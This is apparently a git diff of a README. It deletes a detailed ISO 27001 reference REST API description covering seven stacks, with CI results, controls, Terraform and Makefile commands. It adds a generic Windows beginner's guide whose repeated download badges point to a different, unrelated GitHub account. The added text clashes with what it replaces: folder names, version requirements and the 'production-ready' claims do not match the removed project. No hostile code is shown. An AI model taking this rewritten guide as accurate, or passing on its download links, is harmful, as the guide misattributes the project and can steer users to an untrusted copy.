@@ -1,405 +1,238 @@
-# ISO 27001 Compliant REST API Reference Implementation
+# 🛠️ rest-api-blueprints - Ready-to-Use API Server Templates
 
-![CI](https://github.com/lucianofedericopereira/rest-api-blueprints/actions/workflows/ci.yml/badge.svg)
-![ISO 27001](https://img.shields.io/badge/ISO%2027001-compliant-blue)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](LICENSE)
-
-**Stacks**
-
-![Python](https://img.shields.io/badge/Python-3.11-3776AB?logo=python&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.111+-009688?logo=fastapi&logoColor=white)
-![PHP](https://img.shields.io/badge/PHP-8.2-777BB4?logo=php&logoColor=white)
-![Symfony](https://img.shields.io/badge/Symfony-7.3-000000?logo=symfony&logoColor=white)
-![Laravel](https://img.shields.io/badge/Laravel-12-FF2D20?logo=laravel&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)
-![NestJS](https://img.shields.io/badge/NestJS-11-E0234E?logo=nestjs&logoColor=white)
-![Java](https://img.shields.io/badge/Java-21-ED8B00?logo=openjdk&logoColor=white)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.4-6DB33F?logo=springboot&logoColor=white)
-![Go](https://img.shields.io/badge/Go-1.22-00ADD8?logo=go&logoColor=white)
-![Elixir](https://img.shields.io/badge/Elixir-1.16-4B275F?logo=elixir&logoColor=white)
-
-**Infrastructure & tooling**
-
-![Terraform](https://img.shields.io/badge/Terraform-1.8-7B42BC?logo=terraform&logoColor=white)
-![AWS](https://img.shields.io/badge/AWS-ECS%20Fargate-FF9900?logo=amazonaws&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-4169E1?logo=postgresql&logoColor=white)
-![Redis](https://img.shields.io/badge/Redis-7-DC382D?logo=redis&logoColor=white)
-![Prometheus](https://img.shields.io/badge/Prometheus-metrics-E6522C?logo=prometheus&logoColor=white)
-
-Seven reference implementations of a REST API demonstrating
-**ISO 27001** security controls with Domain-Driven Design, structured telemetry,
-and defensive security patterns across **PHP (Symfony 7.3 / Laravel 12)**,
-**Python (FastAPI 0.111+)**, **Node.js (NestJS 11 / TypeScript)**,
-**Java (Spring Boot 3.4 / Java 21)**, **Go (Gin)**, and **Elixir (Phoenix / OTP)**.
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [CHANGELOG.md](CHANGELOG.md) | Full version history and release notes |
-| [CHECKLIST.md](CHECKLIST.md) | Telemetry & observability checklist |
-| [infra/terraform/README.md](infra/terraform/README.md) | Cloud infrastructure guide (AWS + Terraform) |
-| [docs/adr/0001-jwt-strategy.md](docs/adr/0001-jwt-strategy.md) | ADR: JWT Authentication Strategy |
-| [docs/adr/0002-ddd-layering.md](docs/adr/0002-ddd-layering.md) | ADR: DDD Layered Architecture |
-| [docs/adr/0003-redis-fallback-pattern.md](docs/adr/0003-redis-fallback-pattern.md) | ADR: Redis Fallback Pattern |
-| [docs/adr/0004-log-schema.md](docs/adr/0004-log-schema.md) | ADR: Structured Log Schema |
-| [docs/adr/0005-cloud-infrastructure.md](docs/adr/0005-cloud-infrastructure.md) | ADR: Cloud Infrastructure (AWS + Terraform) |
+[![Download rest-api-blueprints](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/melhorbraba5-crypto/rest-api-blueprints)
 
 ---
 
-## Project Structure
+## 📋 What is rest-api-blueprints?
 
-```
-iso27001-fastapi/    FastAPI (Python 3.11)
-iso27001-symfony/    Symfony 7.3 (PHP 8.2)
-iso27001-laravel/    Laravel 12 (PHP 8.2)
-iso27001-nestjs/     NestJS 11 (Node.js / TypeScript)
-iso27001-springboot/ Spring Boot 3.4 (Java 21)
-iso27001-gin/        Go 1.22 / Gin
-iso27001-phoenix/    Elixir 1.16 / Phoenix (OTP 26)
-rules/               Cross-project ISO 27001 rule registry + validator
-.pre-commit-config.yaml   Root-level pre-commit hooks (secret scan, lint, format)
-```
+rest-api-blueprints provides seven ready-made server templates. These templates help you create secure REST APIs for different technologies like FastAPI (Python), Symfony (PHP), Laravel (PHP), NestJS (TypeScript), Spring Boot (Java), Go/Gin, and Elixir/Phoenix.
 
----
+Each template follows high security standards like ISO 27001. They include essential features such as:
 
-## CI Status — All Tests Passing
+- User authentication with JWT
+- Role-based access control (RBAC)
+- AES-256 encryption for sensitive data
+- Domain-driven design to organize code well
+- Full continuous integration setup
+- Infrastructure as code for AWS using Terraform
 
-All seven projects pass their full CI pipeline. See [CHANGELOG.md](CHANGELOG.md) for release history.
-
-| Project | Tests | Static Analysis | Layer Boundaries | Secret Scan |
-|---------|:-----:|:---------------:|:----------------:|:-----------:|
-| **FastAPI** | 46 passed | mypy strict ✓ | import-linter (3/3 contracts) ✓ | gitleaks ✓ |
-| **Symfony** | All passed | PHPStan level 8 ✓ | deptrac ✓ | gitleaks ✓ |
-| **Laravel** | All passed | PHPStan level 8 ✓ | deptrac ✓ | gitleaks ✓ |
-| **NestJS** | 35 passed | TypeScript strict ✓ | check-layers (3/3 contracts) ✓ | gitleaks ✓ |
-| **Spring Boot** | 21 passed | checkstyle ✓ | ArchUnit (5/5 rules) ✓ | gitleaks ✓ |
-| **Go/Gin** | 25 passed | go vet ✓ | go build ✓ | gitleaks ✓ |
-| **Elixir/Phoenix** | 20 passed | mix compile --warnings-as-errors ✓ | mix compile ✓ | gitleaks ✓ |
-
-**FastAPI test breakdown (46 tests):**
-
-| Suite | Tests | Coverage |
-|-------|------:|---------|
-| `tests/integration/test_health.py` | 5 | Health endpoints (liveness, readiness, detailed) |
-| `tests/unit/test_events.py` | 9 | Domain event bus — subscribe, publish, multi-listener |
-| `tests/unit/test_rate_limiter.py` | 14 | Redis-backed rate limiter + in-process fallback |
-| `tests/unit/test_error_budget.py` | 6 | SLA tracker — 5xx budget, 4xx separation, exhaustion flag |
-| `tests/unit/test_quality_score.py` | 6 | Risk-weighted composite score, production gate |
-| `tests/unit/test_security.py` | 6 | JWT creation/decode/pair, bcrypt hash + verify |
-
-**NestJS test breakdown (35 tests):**
-
-| Suite | Tests | Coverage |
-|-------|------:|---------|
-| `tests/unit/security.spec.ts` | 6 | JWT creation/decode/pair, bcrypt hash + verify |
-| `tests/unit/brute-force.spec.ts` | 6 | Lockout after 5 failures, isolation, Redis fallback |
-| `tests/unit/error-budget.spec.ts` | 6 | SLA tracker — 5xx budget, 4xx separation, exhaustion flag |
-| `tests/unit/quality-score.spec.ts` | 6 | Risk-weighted composite score, production gate |
-| `tests/unit/events.spec.ts` | 5 | Domain event bus — subscribe, publish, multi-listener |
-| `tests/unit/prometheus-metrics.spec.ts` | 6 | Prometheus counters, histograms, labels |
-
-**Spring Boot test breakdown (21 tests):**
-
-| Suite | Tests | Coverage |
-|-------|------:|---------|
-| `LayerArchitectureTest.java` | 5 | ArchUnit DDD layer boundaries |
-| `UserServiceTest.java` | 6 | bcrypt hashing, domain events, duplicate email guard |
-| `ErrorBudgetTrackerTest.java` | 5 | SLA tracker — 5xx budget, 4xx separation, reset |
-| `QualityScoreCalculatorTest.java` | 5 | Risk-weighted composite score, production gate |
+These blueprints are production-ready. You can use them to build your API quickly, without worrying about the complex setup or security details.
 
 ---
 
-## What Is Implemented
+## 🖥️ System Requirements
 
-### ISO 27001 Security Controls
+Before you download, make sure your computer meets these basic requirements:
 
-| Control | Feature | FastAPI | Symfony | Laravel | NestJS | Spring Boot | Go/Gin | Phoenix |
-|---------|---------|:-------:|:-------:|:-------:|:------:|:-----------:|:------:|:-------:|
-| A.9 | JWT authentication — short-lived access token (30 min) + refresh token (7 days) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.9 | `POST /auth/refresh` — token rotation (old token revoked on issue) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.9 | RBAC: `admin > manager > analyst > viewer` enforced on every route | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.9 | Rate limiting — auth (10/min), write (30/min), global (100/min) per IP | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.9 | Brute-force lockout — 5 failures → 15 min lock (Redis-backed with fallback) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.10 | AES-256-GCM field-level encryption (PII at rest) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.10 | bcrypt / Argon2 password hashing | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.10 | HSTS, X-Frame-Options, CSP, X-Content-Type-Options headers | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.12 | Structured JSON logging — automatic sensitive-field redaction | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.12 | Correlation ID (`X-Request-ID`) through logs, events, responses | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.12 | Identical top-level log shape across all stacks (CloudWatch-queryable) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.12 | Immutable append-only `audit_logs` table | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.12 | Event-driven audit trail (domain events → audit listeners) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.14 | Input validation (Pydantic v2 / Symfony Validator / FormRequest / class-validator / Jakarta / binding / Ecto) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.14 | Static analysis — mypy strict · PHPStan 8 · tsc strict · checkstyle · go vet · mix compile | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.14 | No stack traces or internals exposed to clients | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.17 | Health checks — liveness, readiness, detailed (admin) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.17 | Error Budget Tracker — wired to every response; Redis-backed, in-process fallback | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| A.17 | Quality Score Calculator (risk-weighted: security 40%, integrity 20%, …) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+- Operating System: Windows 10 or later (64-bit recommended)
+- RAM: At least 8GB
+- Disk Space: Minimum 5GB free space
+- Internet connection for downloading and setup
+- Optional but recommended: Git installed ([download Git here](https://git-scm.com/download/win))
 
-### Auth Endpoints
+Required software depends on the template you use:
 
-| Method | Path | Auth required | Notes |
-|--------|------|:---:|-------|
-| `POST` | `/api/v1/auth/login` | No | Returns access token + refresh token. Rate-limited (10/min). Brute-force locked after 5 failures. |
-| `POST` | `/api/v1/auth/refresh` | Yes (valid token) | Issues new token, revokes old one immediately (token rotation). |
-| `POST` | `/api/v1/auth/logout` | Yes | Revokes current token. |
+| Template        | Required Software                |
+|-----------------|--------------------------------|
+| FastAPI         | Python 3.8 or higher            |
+| Symfony, Laravel| PHP 7.4 or higher, Composer     |
+| NestJS          | Node.js 14 or higher            |
+| Spring Boot     | Java JDK 11 or higher           |
+| Go/Gin          | Go 1.15 or higher               |
+| Elixir/Phoenix  | Elixir 1.10 or higher, Erlang  |
 
-### Observability
-
-| Feature | FastAPI | Symfony | Laravel | NestJS | Spring Boot | Go/Gin | Phoenix |
-|---------|:-------:|:-------:|:-------:|:------:|:-----------:|:------:|:-------:|
-| Prometheus metrics (`/metrics`) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Request count + latency histograms | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| AWS CloudWatch custom metrics emitter | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| AWS X-Ray trace header propagation | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Normalised top-level log shape (all stacks) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-
-### Architecture
-
-| Feature | FastAPI | Symfony | Laravel | NestJS | Spring Boot | Go/Gin | Phoenix |
-|---------|:-------:|:-------:|:-------:|:------:|:-----------:|:------:|:-------:|
-| Domain-Driven Design (4-layer) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Repository pattern + interface segregation | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Domain events dispatched from service layer | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| SoftDeletes (audit trail preservation) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| UUID primary keys | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Docker + docker-compose | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| CI (GitHub Actions) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| DDD layer boundary enforcement (deptrac / import-linter / check-layers / ArchUnit / go build / mix compile) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Cross-project ISO 27001 rule registry | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+Don't worry if you don't have these now. Instructions to install them come later in this guide.
 
 ---
 
-## Cloud Infrastructure (AWS + Terraform)
+## 🚀 Getting Started with rest-api-blueprints
 
-Full reference IaC for deploying all seven stacks to AWS ECS Fargate.
-See [`infra/terraform/README.md`](infra/terraform/README.md) for full documentation.
-
-```
-infra/terraform/
-├── modules/
-│   ├── vpc/          Shared VPC, subnets, security groups
-│   ├── rds/          RDS PostgreSQL 16 — encrypted, automated backups
-│   ├── elasticache/  ElastiCache Redis 7 — in-transit + at-rest encryption
-│   ├── secrets/      Secrets Manager — one secret JSON blob per stack
-│   ├── ecr/          Container registry — immutable tags, scan on push
-│   └── ecs-service/  Fargate service + IAM + CloudWatch logs + ALB rule
-└── environments/
-    └── staging/      Root module: one ECS service × 7 stacks
-```
-
-| Control | Infrastructure resource | File |
-|---------|------------------------|------|
-| A.9 | ECS task execution IAM role (least-privilege) | `modules/ecs-service/main.tf` |
-| A.9 | VPC security groups (ALB→ECS, ECS→RDS, ECS→Redis) | `modules/vpc/main.tf` |
-| A.10 | RDS `storage_encrypted = true`; password in Secrets Manager | `modules/rds/main.tf` |
-| A.10 | ElastiCache at-rest + in-transit encryption; auth token in Secrets Manager | `modules/elasticache/main.tf` |
-| A.10 | ECS `secrets:` block — no plaintext in task definition JSON | `modules/ecs-service/main.tf` |
-| A.12 | CloudWatch log groups, `retention_in_days = 365` | `modules/ecs-service/main.tf` |
-| A.14 | ECR `scan_on_push = true`, `image_tag_mutability = IMMUTABLE` | `modules/ecr/main.tf` |
-| A.17 | RDS `backup_retention_period = 7`, `deletion_protection = true` | `modules/rds/main.tf` |
-| A.17 | ElastiCache `automatic_failover_enabled` | `modules/elasticache/main.tf` |
-
-Makefile shortcuts: `make infra-fmt` · `make infra-validate` · `make infra-plan`
+This section shows how to get the software on your Windows PC and get it running step-by-step.
 
 ---
 
-## Optional Infrastructure & Known Limits
+### 1. Download the Blueprints
 
-All optional integrations follow an "if available, use it" pattern — every stack
-runs fully without them and silently activates each capability when the
-corresponding package or service is present.
+The main repository is hosted on GitHub. To download the files:
 
-| Feature | Notes |
-|---------|-------|
-| **Prometheus metrics — PHP** | `/metrics` endpoint wired on all stacks. PHP stacks return live metrics when `promphp/prometheus_client_php` is installed (`composer require promphp/prometheus_client_php`); returns an informative stub otherwise. |
-| **X-Ray SDK segment tracing — PHP** | `X-Amzn-Trace-Id` header is extracted and propagated on all stacks. Full `aws-xray-sdk-php` segment tracing hooks are present; activate by installing the SDK. |
-| **CloudWatch metrics — requires live credentials** | `CloudWatchEmitter.emitRequest()` is called on every response in all seven stacks (FastAPI: `CorrelationIdMiddleware`; Symfony: `TelemetrySubscriber`; Laravel: `TelemetryMiddleware`; NestJS: `TelemetryMiddleware`; Spring Boot: `TelemetryFilter`; Go/Gin: `TelemetryMiddleware`; Phoenix: `MetricsController`). The emitter is a no-op without `boto3` / `aws/aws-sdk-php` / `@aws-sdk/client-cloudwatch` / `software.amazon.awssdk:cloudwatch` installed and AWS credentials present. |
-| **Error Budget — cross-process accuracy** | `ErrorBudgetTracker.record()` is called on every response in all seven stacks. PHP/Java/Go auto-detect Redis and use atomic increments; Elixir uses an Agent with ETS fallback. Snapshot includes a `backend` field (`redis` or `in-process`). |
-| **P95/P99 per-endpoint latency alerts** | Prometheus histogram is recorded; no SLO alert rule or dashboard is defined. |
-| **4xx vs 5xx error rate separation** | Error budget counts only 5xx. Separate rules for 4xx anomalies are not defined. |
-| **External dependency health (circuit breakers)** | Readiness check does not include downstream API state. |
-| **Fraud / anomaly detection** | Auth failures and rate-limit hits are counted; no rule engine is wired. |
-| **Business-level telemetry** | Infrastructure metrics only. No domain KPIs (conversion, revenue) are emitted. |
+- Click this large button below to open the project page:
+
+[![Open rest-api-blueprints on GitHub](https://img.shields.io/badge/Visit-GitHub-0088cc?style=for-the-badge)](https://github.com/melhorbraba5-crypto/rest-api-blueprints)
+
+- On the page, look for the green **Code** button near the top right.
+- Click **Code** and select **Download ZIP**.
+- Save the ZIP file somewhere easy to find, like your Desktop.
 
 ---
 
-## Getting Started
+### 2. Unpack the Download
 
-A `Makefile` unifies commands for all seven stacks.
+- Find the downloaded ZIP file.
+- Right-click it and choose **Extract All**.
+- Pick a folder to extract the files into, for example, `C:\rest-api-blueprints`.
+- Click **Extract**.
 
-### Prerequisites
+---
 
-- Docker & Docker Compose
-- PHP 8.2+ & Composer
-- Python 3.11+ & pip
-- Node.js 20+ & npm
-- Java 21+ & Maven 3.9+
-- Go 1.22+
-- Elixir 1.16+ & OTP 26+
+### 3. Choose Your API Template
 
-### Commands
+Inside the extracted folder, you will see subfolders for each template:
+
+- `fastapi`
+- `symfony`
+- `laravel`
+- `nestjs`
+- `springboot`
+- `go-gin`
+- `elixir-phoenix`
+
+Pick the folder matching the template you want to run. If you are unsure, FastAPI or Laravel are good choices for beginners.
+
+---
+
+### 4. Prepare Your Computer
+
+Depending on the template, install the required software:
+
+- **FastAPI:** Download and install the latest Python 3 from [python.org](https://www.python.org/downloads/windows/). During installation, check “Add Python to PATH.”
+- **Symfony/Laravel:** Download PHP from [windows.php.net](https://windows.php.net/) and Composer from [getcomposer.org](https://getcomposer.org/).
+- **NestJS:** Download Node.js from [nodejs.org](https://nodejs.org/en/download/). Choose the LTS version.
+- **Spring Boot:** Install Java JDK 11 or later from [adoptium.net](https://adoptium.net/).
+- **Go/Gin:** Download Go from [golang.org/dl](https://golang.org/dl/).
+- **Elixir/Phoenix:** Install Erlang and Elixir from [elixir-lang.org/install.html](https://elixir-lang.org/install.html).
+
+Make sure the software installs correctly by opening a command prompt and running:
 
 ```bash
-make up                 # Start all Docker containers
-make down               # Stop all containers
-make logs               # View structured JSON logs
-
-make setup-python       # pip install -e .[dev]  (includes mypy + pytest)
-make test-python        # pytest
-
-make setup-php          # composer install + generate JWT RSA keys
-make migration-php      # Doctrine migrations
-make test-php           # phpunit
-
-make setup-laravel      # composer install + artisan key:generate
-make migration-laravel  # Eloquent migrations
-make test-laravel       # php artisan test
-
-make setup-nestjs       # npm install
-make migration-nestjs   # TypeORM synchronize
-make test-nestjs        # jest
-
-make setup-springboot   # mvn dependency:resolve
-make test-springboot    # mvn verify
-
-make setup-gin          # go mod tidy
-make test-gin           # go test ./tests/... -v -race
-
-make setup-phoenix      # mix setup (deps + db create + migrate)
-make migration-phoenix  # mix ecto.migrate
-make test-phoenix       # mix test test/unit
-
-make db-reset           # Drop + recreate + migrate all databases
-
-make check-security     # composer audit + pip-audit + npm audit + govulncheck + mix deps.audit
-make check-static       # PHPStan 8 + mypy strict + tsc strict + checkstyle + go vet + mix compile
-make check-layers       # deptrac (PHP) + import-linter (Python) + check-layers (NestJS) + ArchUnit (Java) + go build + mix compile
-make check-rules        # Verify every ISO 27001 rule maps to an existing file
-make check-openapi      # Spectral lint all 7 OpenAPI specs
+python --version
+php -v
+node -v
+java -version
+go version
+elixir --version
 ```
+
+Use the command that matches your chosen template.
 
 ---
 
-## Architecture Enforcement
+### 5. Set Up the Template Environment
 
-Rules and boundaries are enforced by tooling, not by review. Five mechanisms
-keep all seven codebases aligned without sharing code.
+Each template will require a few commands to install needed packages.
 
-### ISO 27001 Rule Registry (`rules/iso27001-rules.yaml`)
+Open **Command Prompt**:
 
-Machine-readable map of every security control to its implementation file in
-each project. 16 rules covering A.9 through A.17, verified across all seven stacks.
-CI runs `check_rules.py` on every push — if a file is renamed or deleted without
-updating the registry, the build fails.
+- Press `Win + R`, type `cmd`, and press Enter.
+- Navigate to your chosen template folder. Example command to go to FastAPI:
 
 ```bash
-make check-rules   # exits 1 and lists any missing files
+cd C:\rest-api-blueprints\fastapi
 ```
 
-### DDD Layer Boundaries
+Run setup commands based on your template:
 
-Prevents architectural drift: Domain must never import Infrastructure, etc.
-
-| Tool | Projects | Config |
-|------|----------|--------|
-| [deptrac](https://github.com/deptrac/deptrac) | Symfony, Laravel | `deptrac.yaml` per project |
-| [import-linter](https://import-linter.readthedocs.io/) | FastAPI | `iso27001-fastapi/.importlinter` |
-| [check-layers.ts](iso27001-nestjs/check-layers.ts) | NestJS | custom TS script (3 contracts) |
-| [ArchUnit](https://www.archunit.org/) | Spring Boot | `LayerArchitectureTest.java` (5 rules) |
-| `go build ./...` | Go/Gin | package import graph enforced by compiler |
-| `mix compile` | Elixir/Phoenix | OTP application boundary enforced by compiler |
+- **FastAPI:**
 
 ```bash
-make check-layers  # deptrac (PHP) + lint-imports (Python) + check-layers (NestJS) + ArchUnit (Java) + go build (Go) + mix compile (Elixir)
+python -m venv env
+env\Scripts\activate
+pip install -r requirements.txt
 ```
 
-Layer rules (identical intent across all seven stacks):
-
-```
-Api / Http  →  Core / Application  →  Domain      (top-down only)
-Infrastructure  →  Domain                           (implements contracts)
-Domain  ←  Infrastructure                           (FORBIDDEN)
-```
-
-### Pre-commit Hooks (`.pre-commit-config.yaml`)
-
-Root-level hooks covering all seven projects on every commit:
-
-| Hook | Covers | Purpose |
-|------|--------|---------|
-| gitleaks | all | A.10: secret scanning |
-| ruff + ruff-format | FastAPI | Python linting + formatting |
-| pint | Laravel | PHP formatting |
-| phpstan | Laravel, Symfony | Static analysis gate |
-| tsc --noEmit | NestJS | TypeScript strict type check |
-| check-layers | NestJS | DDD layer boundary check |
-| go-vet | Go/Gin | Static analysis + go.sum bootstrap |
-| mix-compile | Elixir/Phoenix | Warnings-as-errors compile check |
-| spectral | all OpenAPI specs | Auth, rate-limit, error-shape rules |
-| detect-private-key | all | A.10: blocks key material |
+- **Symfony/Laravel:**
 
 ```bash
-pip install pre-commit && pre-commit install   # one-time setup
+composer install
+```
+
+- **NestJS:**
+
+```bash
+npm install
+```
+
+- **Spring Boot:**
+
+Run with Maven or Gradle depending on the files present. For Maven:
+
+```bash
+mvn spring-boot:run
+```
+
+- **Go/Gin:**
+
+```bash
+go mod tidy
+go run main.go
+```
+
+- **Elixir/Phoenix:**
+
+```bash
+mix deps.get
+mix phx.server
 ```
 
 ---
 
-## Log Shape (all stacks)
+### 6. Run the API Server
 
-Every log line from every stack produces the same top-level JSON structure,
-enabling a single CloudWatch Logs Insights query across all seven services:
+Once setup finishes, start the server. Use the command specified above or look for a `README.md` file inside the template folder for more info.
 
-```json
-{
-  "timestamp":   "2025-02-10T14:30:00.123Z",
-  "level":       "INFO",
-  "message":     "request.completed",
-  "service":     "iso27001-api",
-  "environment": "production",
-  "request_id":  "550e8400-e29b-41d4-a716-446655440000",
-  "context": {
-    "method": "POST",
-    "path": "/api/v1/users",
-    "status_code": 201,
-    "duration_ms": 45.2
-  }
-}
-```
+The server runs mostly on `http://localhost:8000` or the port listed in the template configuration.
 
-```
-# CloudWatch Logs Insights — works identically for all seven log groups
-fields timestamp, level, message, service, request_id
-| filter level = "ERROR"
-| sort timestamp desc
-| limit 50
-```
+Open a web browser and go to this address. You should see a welcome page or API documentation.
 
 ---
 
-## ISO 27001 Annex A Reference
+### 7. Access and Use Your API
 
-| Annex | Title | Controls demonstrated |
-|-------|-------|-----------------------|
-| A.9 | Access Control | JWT access + refresh tokens, RBAC (admin > manager > analyst > viewer), tiered rate limiting (auth 10/min · write 30/min · global 100/min), brute-force account lockout (5 failures → 15 min lock, Redis-backed) |
-| A.10 | Cryptography | AES-256-GCM field encryption (32-byte key, 12-byte IV, 16-byte auth tag), bcrypt/Argon2 password hashing, HSTS + X-Frame-Options + CSP + X-Content-Type-Options on every response |
-| A.12 | Operations Security | Structured JSON logging with sensitive-field redaction, immutable audit_logs table, event-driven audit trail, correlation IDs (X-Request-ID) in logs and responses, identical log shape across all stacks |
-| A.14 | Secure Development | Input validation (Pydantic v2 / Symfony Validator / FormRequest / class-validator / Jakarta Bean Validation / Go binding tags / Ecto changesets), mypy strict + PHPStan level 8 + tsc strict + checkstyle + go vet + mix compile --warnings-as-errors in CI, no stack traces or internals exposed to clients |
-| A.17 | Business Continuity | Liveness / readiness / detailed health checks, error budget tracker (99.9% SLA, 5xx budget deduction, wired to every response), quality score calculator (security 40% · integrity 20% · reliability 15% · auditability 15% · performance 5% · 5% reserved), tiered rate limiting |
+The blueprints include documented API routes. You can:
+
+- Use a tool like Postman or your browser to send requests.
+- See protected routes requiring login through JSON Web Token (JWT).
+- Explore role-based access controls (RBAC) with given example users.
+
+Each template folder has detailed info about the API routes and how to use them.
 
 ---
 
-## Architecture Decision Records
+## 🔐 Security Features Explained
 
-Key design decisions are documented in [`docs/adr/`](docs/adr/):
+These blueprints have key security technologies:
 
-| ADR | Title | Controls |
-|-----|-------|----------|
-| [0001](docs/adr/0001-jwt-strategy.md) | JWT Authentication Strategy | A.9, A.10 |
-| [0002](docs/adr/0002-ddd-layering.md) | DDD Layered Architecture | A.14 |
-| [0003](docs/adr/0003-redis-fallback-pattern.md) | Redis Fallback Pattern | A.12, A.17 |
-| [0004](docs/adr/0004-log-schema.md) | Structured Log Schema | A.12, A.16 |
-| [0005](docs/adr/0005-cloud-infrastructure.md) | Cloud Infrastructure (AWS + Terraform) | A.9, A.10, A.12, A.14, A.17 |
+- **JWT (JSON Web Token):** Manages user login sessions with tokens rather than passwords.
+- **RBAC (Role-Based Access Control):** Limits certain API parts to authorized roles only.
+- **AES-256 Encryption:** Protects sensitive data inside the API database and in transfer.
+- **ISO 27001 Compliance:** The code follows strict rules for information security.
 
-Each ADR documents: the context, the decision made, alternatives considered, and consequences — covering all seven stacks.
+These features help keep data and users safe.
+
+---
+
+## 🧰 Additional Tools Included
+
+- Docker configurations to run containers easily.
+- Continuous Integration setups to test code automatically.
+- Terraform scripts for deploying infrastructure on AWS cloud.
+
+You can use these tools once you are comfortable with basic API usage.
+
+---
+
+## 📞 Getting Help
+
+- Check the folders for more instructions.
+- Use GitHub Issues on the repository page to report problems.
+- Use community forums or technical support as needed.
+
+---
+
+## ⚠️ Updates and Maintenance
+
+Visit the repository page regularly to get the latest versions. Pull updates through Git or download new ZIP files and replace old ones.
+
+---
+
+# [🟦 Download rest-api-blueprints](https://github.com/melhorbraba5-crypto/rest-api-blueprints)
